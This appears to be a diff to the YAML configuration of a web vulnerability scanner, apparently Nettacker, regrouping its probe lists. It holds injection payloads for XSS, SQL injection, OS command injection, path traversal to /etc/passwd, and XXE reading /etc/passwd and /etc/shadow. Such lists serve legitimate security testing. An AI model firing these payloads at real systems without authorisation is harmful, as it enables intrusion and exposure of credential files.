@@ -64,36 +64,64 @@ payloads:
                 - 443
               query:
                 - a
-                - q
-                - s
-                - page
-                - file
-                - download
-                - site
-                - date
-                - action
+                # - q
+                # - s
+                # - page
+                # - file
+                # - download
+                # - site
+                # - date
+                # - action
               param:
-                - <script>alert(\"NETTACKER\");</script>                          # xss
-                - UNION SELECT ALL FROM information_schema AND ' or SLEEP(5) or ' # sqli
-                - /bin/cat /etc/passwd; ping 127.0.0.1; curl google.com           # os_command_injection
-                - <!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><pwn>&hack;</pwn> # xxe
-                - ../../../../etc/passwd                                         # lfi
+                # -------------------------
+                # XSS
+                # -------------------------
+                - "<script>alert(\\\"NETTACKER\\\");</script>"              # xss
+                - "<script>alert(1);</script>"                          # xss
+                - "<script>alert(\\\"test\\\");</script>"                   # xss
+                - "<script>alert('test');</script>"                     # xss
+                - "<img src=x onerror=alert(1)>"                         # xss (event-based)
+                - "\\\"><script>alert(\\\"XSS\\\");</script>"                 # xss (breakout)
 
-                - - "484029 AS xDKy WHERE 5427=5427 UNION ALL SELECT NULL,NULL"  # sqli (union-based)
-                - "' AND 1=1 '"                                                  # sqli (boolean-based)
-                - "' )) AND '1'='1 ((( '"                                        # sqli (logic manipulation)
-                - "AND 1=1"                                                      # sqli (boolean-based)
-                - "' AND 1=1 OR 2=2 '"                                           # sqli (boolean-based)
-                - "' AND 1=1 OR 9=10 ORDERBY(1,2,3,4,5)"                          # sqli (order by)
-                - "' AND 1=1;SELECT * FROM information_schema.tables '"          # sqli (stacked queries)
-                - "SELECT * FROM information_schema.tables"                      # sqli (information_schema)
-                - "UNION SELECT * FROM users WHERE user='admin'"                 # sqli (union-based)
+                # -------------------------
+                # SQL Injection – boolean based
+                # -------------------------
+                - "' AND 1=1 '"                                         # sqli (boolean)
+                - "' AND 1=1 OR 2=2 '"                                  # sqli (boolean)
+                - "' AND 1=1 OR 9=10"                                   # sqli (boolean)
+                - "AND 1=1"                                             # sqli (boolean)
 
-                - "/bin/cat /etc/passwd"                                         # os_command_injection
-                - "<script>alert(1);</script>"                                   # xss
-                - "<img src=x onerror=alert(1)>"                                 # xss (event-based)
-                - "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>"                  # xxe
+                # -------------------------
+                # SQL Injection – union based
+                # -------------------------
+                - "UNION SELECT ALL FROM information_schema AND SLEEP(5)"  # sqli (union)
+                - "484029 AS xDKy WHERE 5427=5427 UNION ALL SELECT NULL,NULL" # sqli (union)
+                - "AS start WHERE 1601=1601 UNION ALL SELECT NULL,NULL"     # sqli (union)
+                - "UNION SELECT * FROM users WHERE user='admin'"           # sqli (union)
 
+                # -------------------------
+                # SQL Injection – order by / stacked
+                # -------------------------
+                - "' AND 1=1 ORDER BY 1,2,3,4,5"                         # sqli (order by)
+                - "' AND 1=1;SELECT * FROM information_schema.tables"    # sqli (stacked)
+                - "SELECT * FROM information_schema.tables"              # sqli (info schema)
+
+                # -------------------------
+                # OS Command Injection
+                # -------------------------
+                - "/bin/cat /etc/passwd"                                 # os_command_injection
+                - "/bin/cat /etc/passwd; ping 127.0.0.1"                 # os_command_injection
+
+                # -------------------------
+                # LFI
+                # -------------------------
+                - "../../../../etc/passwd"                               # lfi
+
+                # -------------------------
+                # XXE
+                # -------------------------
+                - "<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">"          # xxe
+                - "<!ENTITY xxe SYSTEM \\\"file:///etc/shadow\\\">"          # xxe
         response:
           dependent_on_temp_event: valid_request_status
           condition_type: or
@@ -2263,27 +2291,55 @@ payloads:
                 - 80
                 - 443
               payload:
-                - <script>alert(\"NETTACKER\");</script>                          # xss
-                - UNION SELECT ALL FROM information_schema AND ' or SLEEP(5) or ' # sqli
-                - /bin/cat /etc/passwd; ping 127.0.0.1; curl google.com           # os_command_injection
-                - <!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><pwn>&hack;</pwn> # xxe
-                - ../../../../etc/passwd                                         # lfi
+                # -------------------------
+                # XSS
+                # -------------------------
+                - "<script>alert(\\\"NETTACKER\\\");</script>"              # xss
+                - "<script>alert(1);</script>"                          # xss
+                - "<script>alert(\\\"test\\\");</script>"                   # xss
+                - "<script>alert('test');</script>"                     # xss
+                - "<img src=x onerror=alert(1)>"                         # xss (event-based)
+                - "\\\"><script>alert(\\\"XSS\\\");</script>"                 # xss (breakout)
 
-                - "484029 AS xDKy WHERE 5427=5427 UNION ALL SELECT NULL,NULL"  # sqli (union-based)
-                - "' AND 1=1 '"                                                  # sqli (boolean-based)
-                - "' )) AND '1'='1 ((( '"                                        # sqli (logic manipulation)
-                - "AND 1=1"                                                      # sqli (boolean-based)
-                - "' AND 1=1 OR 2=2 '"                                           # sqli (boolean-based)
-                - "' AND 1=1 OR 9=10 ORDERBY(1,2,3,4,5)"                          # sqli (order by)
-                - "' AND 1=1;SELECT * FROM information_schema.tables '"          # sqli (stacked queries)
-                - "SELECT * FROM information_schema.tables"                      # sqli (information_schema)
-                - "UNION SELECT * FROM users WHERE user='admin'"                 # sqli (union-based)
+                # -------------------------
+                # SQL Injection – boolean based
+                # -------------------------
+                - "' AND 1=1 '"                                         # sqli (boolean)
+                - "' AND 1=1 OR 2=2 '"                                  # sqli (boolean)
+                - "' AND 1=1 OR 9=10"                                   # sqli (boolean)
+                - "AND 1=1"                                             # sqli (boolean)
 
-                - "/bin/cat /etc/passwd"                                         # os_command_injection
-                - "<script>alert(1);</script>"                                   # xss
-                - "<img src=x onerror=alert(1)>"                                 # xss (event-based)
-                - "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>"                  # xxe
+                # -------------------------
+                # SQL Injection – union based
+                # -------------------------
+                - "UNION SELECT ALL FROM information_schema AND SLEEP(5)"  # sqli (union)
+                - "484029 AS xDKy WHERE 5427=5427 UNION ALL SELECT NULL,NULL" # sqli (union)
+                - "AS start WHERE 1601=1601 UNION ALL SELECT NULL,NULL"     # sqli (union)
+                - "UNION SELECT * FROM users WHERE user='admin'"           # sqli (union)
 
+                # -------------------------
+                # SQL Injection – order by / stacked
+                # -------------------------
+                - "' AND 1=1 ORDER BY 1,2,3,4,5"                         # sqli (order by)
+                - "' AND 1=1;SELECT * FROM information_schema.tables"    # sqli (stacked)
+                - "SELECT * FROM information_schema.tables"              # sqli (info schema)
+
+                # -------------------------
+                # OS Command Injection
+                # -------------------------
+                - "/bin/cat /etc/passwd"                                 # os_command_injection
+                - "/bin/cat /etc/passwd; ping 127.0.0.1"                 # os_command_injection
+
+                # -------------------------
+                # LFI
+                # -------------------------
+                - "../../../../etc/passwd"                               # lfi
+
+                # -------------------------
+                # XXE
+                # -------------------------
+                - "<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">"          # xxe
+                - "<!ENTITY xxe SYSTEM \\\"file:///etc/shadow\\\">"          # xxe
         response:
           dependent_on_temp_event: valid_request_status
           condition_type: or
